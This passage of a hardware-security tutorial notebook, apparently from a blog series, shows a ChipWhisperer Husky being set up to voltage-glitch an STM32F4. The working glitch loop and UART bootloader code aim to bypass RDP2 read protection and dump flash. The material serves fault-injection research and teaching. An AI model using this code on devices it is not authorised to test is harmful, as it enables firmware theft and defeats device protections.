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' width=640.0/>\n",
       "            </div>\n",
       "        "
      ],
      "text/plain": [
       "Canvas(toolbar=Toolbar(toolitems=[('Home', 'Reset original view', 'home', 'home'), ('Back', 'Back to previous …"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "%matplotlib widget\n",
    "plt.cla()\n",
    "plt.plot(test.waves[0])\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a0aadc56-8176-44bc-b38d-99a9037ab948",
   "metadata": {},
   "source": [
    "\n",
    "# Oscilloscope Integration\n",
    "\n",
    "So at this point, we have configured the Chipwhisperer to trigger on a specific analog pattern outlined in ```vcap_ref```, next we need to dial in our glitch and test it with the oscilloscope to make sure that we are triggering properly. \n",
    "\n",
    "One of the (many) great new features on the Husky, is the addition of the Trigger/Glitch Out port, this line will assert when a trigger event occurs, allowing to then trigger additional equipment, like an oscilloscope for example.\n",
    "\n",
    "# Glitch Placement and Shape\n",
    "\n",
    "Similarly to the [last example](https://voidstarsec.com/blog/replicant-part-1) that we provided, we need to make sure that we properly shape our glitch. Since we are doing voltage glitching as opposed to clock glitching we really only need to dial in two things:\n",
    "\n",
    "1. ```scope.glitch.ext_offset```: How long we wait *after* the trigger before we perform the glitch\n",
    "2. ```scope.glitch.repeat```: How many clock cycles we pull down the vcap line\n",
    "\n",
    "We can dial this in using the oscilloscope, we need to make sure that:\n",
    "\n",
    "1. We are triggering and glitching in the right location\n",
    "2. We are not crashing the target every time we glitch it\n",
    "\n",
    "After some testing, we determined that the following values worked well for glitching the target and _not_ crashing it:\n",
    "\n",
    "```scope.glitch.repeat = 4```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "220d4e79-1a5e-47d6-a886-611c01887b2e",
   "metadata": {},
   "source": [
    "# Glitch Loop\n",
    "\n",
    "Now that we have determined all of our paramters for the glitch, it's time to iterate over the range where we suspect the RDP configuration data is being read out in the bootrom. Based on our analysis of the power trace, the following offset ranges seem promising:\n",
    "\n",
    "7700-7800\n",
    "\n",
    "Finally we set up a simple glitch loop, this will iterate over the specificed ext_offset values, and test to see if the UART bootloader is being executed, if enabled we will add the offset to a list for later analysis."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "852b972d-7ccf-492c-9f54-dd5726cfaf34",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "gc_rdp2 = glitch.GlitchController(groups=[\"success\", \"failure\"], parameters=[\"ext_offset\",\"tries\"])\n",
    "gc_rdp1 = glitch.GlitchController(groups=[\"success\", \"failure\"], parameters=[\"ext_offset\",\"tries\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "40822a44-bc19-4725-923c-721a973da9d4",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "gc_rdp2.display_stats()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a26678ff-c1a8-4894-a5b9-50219cd81778",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "gc_rdp1.display_stats()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "424739d4-cadb-441b-aa63-54204bc6b8f8",
   "metadata": {},
   "source": [
    "# Glitch Configuration and Loop\n",
    "\n",
    "Our glitch loop will contain two glitches. One to bypass RDP2 and enter the UART bootloader, and then another that will glitch the memory read command. \n",
    "\n",
    "**Note:** This example is for the **VOLTAGE/CROWBAR** glitch, which is known to damage STM32F4 series MCUs - so USE AT YOUR OWN RISK - see the G3D Notebook in this repository for an example of how to integrate the PicoEMP with this glitch loop.\n",
    "\n",
    "- `setup_SAD`: This function is used to set up the SAD triggering and references the trace that we examined previously\n",
    "- `set_glitch_one_params`: This function is used to set up the glitch parameters for the SAD trigger, we specify the EXT offset ranges that we want to use after the initial power spike is identified in the trace\n",
    "- `setup_edge_trigger`: This function is responsible for setting up our edge trigger, which is used to perform a glitch after the read memory command has been issued over UART."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9e6a042f-4cc5-4326-aad8-7b22e928d640",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "import chipwhisperer.common.results.glitch as glitch\n",
    "import chipwhisperer as cw\n",
    "import serial\n",
    "import time\n",
    "import sys\n",
    "import os\n",
    "import subprocess\n",
    "import matplotlib.pyplot as plt\n",
    "\n",
    "import serial\n",
    "stm = serial.Serial(\n",
    "            port=\"/dev/ttyUSB0\",\n",
    "            baudrate=9600,\n",
    "            # number of write_data bits\n",
    "            parity=serial.PARITY_EVEN,\n",
    "            timeout=.25\n",
    "        )\n",
    "\n",
    "#scope = cw.scope(scope_type=cw.scopes.OpenADC)\n",
    "scope.default_setup()\n",
    "\n",
    "def serial_check():\n",
    "    stm.write(b'\\x7F')\n",
    "    ret = stm.read(1)\n",
    "    try:\n",
    "        print(ret[0])\n",
    "        if ret[0] == 0x79:\n",
    "            return True\n",
    "    except:\n",
    "        pass\n",
    "    return False\n",
    "\n",
    "def serial_read():\n",
    "    stm.write(b'\\x11\\xEE')\n",
    "    ret = stm.read(1)\n",
    "    try:\n",
    "        if ret[0] == 0x79:\n",
    "            print(f\"Read ACK: {ret}\")\n",
    "            stm.write(b'\\x08\\x00\\x00\\x00\\x08')\n",
    "            time.sleep(.01)\n",
    "            ret = stm.read(1)\n",
    "            if ret[0] != 0x79:\n",
    "                return False,None\n",
    "            print(f\"Address ACK: {ret[0]}\")\n",
    "            stm.write(b'\\xFF\\x00')\n",
    "            time.sleep(.1)\n",
    "            ret = stm.read(0x2000)\n",
    "            print(ret)\n",
    "            return True,ret\n",
    "        else:\n",
    "            return False,None\n",
    "    except:\n",
    "        return False,None\n",
    "    \n",
    "def reboot_flush():            \n",
    "    global scope\n",
    "    scope.io.target_pwr = False\n",
    "    scope.io.nrst = False\n",
    "    time.sleep(1)\n",
    "    scope.io.nrst = \"high_z\"\n",
    "    scope.arm()\n",
    "    scope.io.target_pwr = True\n",
    "    scope.capture()\n",
    "    \n",
    "def soft_reboot(arm):            \n",
    "    global scope\n",
    "    scope.io.nrst = False\n",
    "    time.sleep(1)\n",
    "    scope.io.nrst = \"high_z\"\n",
    "    if arm:\n",
    "        scope.arm()\n",
    "\n",
    "# Modify your trace offset to match your collected trace from the previous example!\n",
    "trace_offset = 42350\n",
    "\n",
    "def setup_SAD():\n",
    "    scope.default_setup()\n",
    "    scope.adc.basic_mode = \"rising_edge\"\n",
    "    scope.gain.gain = 0\n",
    "    scope.gain.db = 15.0\n",
    "    scope.gain.mode = \"low\"\n",
    "    scope.adc.samples = 131124\n",
    "    scope.clock.clkgen_freq = 30e6\n",
    "    scope.adc.offset = 0\n",
    "    scope.clock.adc_mul = 1\n",
    "    scope.trigger.module = 'SAD'\n",
    "    scope.SAD.reference = test.waves[0][trace_offset:trace_offset+32]\n",
    "    scope.SAD.threshold =60\n",
    "    scope.adc.presamples = 1000\n",
    "\n",
    "def set_glitch_one_params():\n",
    "    gc_rdp2.set_global_step(g_step)\n",
    "    # Note: Depending on your trace capture you may need to modify the ext_offset ranges\n",
    "    gc_rdp2.set_range(\"ext_offset\", 7700 , 7800)\n",
    "    gc_rdp2.set_range(\"tries\",1,5)\n",
    "    reboot_flush()\n",
    "    scope.glitch.enabled = True\n",
    "    scope.glitch.clk_src = \"pll\" # set glitch input clock\n",
    "    scope.glitch.output = \"enable_only\" # glitch_out = clk ^ glitch\n",
    "    scope.glitch.trigger_src = \"ext_single\" # glitch only after scope.arm() called\n",
    "    scope.glitch.width = 40\n",
    "    scope.glitch.offset = -45\n",
    "    assert scope.glitch.mmcm_locked\n",
    "\n",
    "def setup_edge_trigger():\n",
    "    scope.reset_fpga()\n",
    "    scope.default_setup()\n",
    "    gc_rdp1.set_range(\"ext_offset\", 50 , 80)\n",
    "    gc_rdp1.set_range(\"tries\",1,5)\n",
    "    scope.adc.basic_mode = \"rising_edge\"\n",
    "    scope.gain.gain = 0\n",
    "    scope.gain.db = 15.0\n",
    "    scope.gain.mode = \"low\"\n",
